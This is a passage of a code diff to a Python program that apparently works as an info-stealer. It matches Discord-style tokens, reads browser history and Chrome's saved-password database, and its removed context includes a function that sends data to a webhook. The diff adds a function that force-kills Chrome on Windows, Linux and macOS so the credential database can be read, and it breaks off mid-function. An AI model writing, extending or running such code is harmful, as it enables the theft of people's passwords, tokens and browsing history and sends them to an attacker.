@@ -11,6 +11,7 @@ import platform
 import subprocess
 import shutil
 import tempfile
+import time
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
 REQUEST_HEADERS = {
@@ -163,42 +164,31 @@ def get_browser_history() -> list[tuple[str, str, datetime]]:
         return [("Error", f"Could not read history: {e}", datetime.now(timezone.utc))]
 
 
-def get_saved_passwords() -> list[tuple[str, str, str]]:
-    """Retrieves saved passwords from Chrome's login data database.
+def close_chrome():
+    """Attempts to close Chrome."""
+    try:
+        if platform.system() == "Windows":
+            subprocess.run(["taskkill", "/im", "chrome.exe", "/f"], check=True, capture_output=True)
+        elif platform.system() == "Linux":
+            subprocess.run(["pkill", "-f", "chrome"], check=True, capture_output=True)
+        elif platform.system() == "Darwin":  # macOS
+            subprocess.run(["pkill", "-f", "Chrome"], check=True, capture_output=True)
+        print("Chrome closed successfully.")
+        time.sleep(2)  # Give it a moment to fully close
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to close Chrome: {e}")
+        return False
+    return True
 
-    Returns:
-        list[tuple[str, str, str]]: A list of tuples containing the URL, username, and password.
-    """
+
+def get_saved_passwords() -> list[tuple[str, str, str]]:
+    """Retrieves saved passwords from Chrome's login data database."""
     login_data_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
     if not login_data_path.exists():
         return [("Error", "Login Data file not found", "")]
 
-    # Create a temporary directory
-    with tempfile.TemporaryDirectory() as temp_dir:
-        temp_login_data_path = Path(temp_dir) / "Login Data"
+    success = close_chrome()
+    if not success:
+        return [("Error", "Could not close Chrome", "")]
 
-        try:
-            # Copy the Login Data file to the temporary directory
-            shutil.copy2(login_data_path, temp_login_data_path)
-
-            conn = sqlite3.connect(str(temp_login_data_path))
-            cursor = conn.cursor()
-
-            cursor.execute("""
-                SELECT origin_url, username_value, password_value
-                FROM logins
-            """)
-
-            passwords = []
-            for origin_url, username_value, password_value in cursor.fetchall():
-                # The password_value is stored encrypted; decryption is complex and beyond the scope of this example
-                passwords.append((origin_url, username_value, "Encrypted Password"))
-
-            conn.close()
-            return passwords
-        except Exception as e:
-            return [("Error", f"Could not read login data: {e}", "")]
-
-
-def send_data_to_webhook(
-    webhook_url: str
+    try:
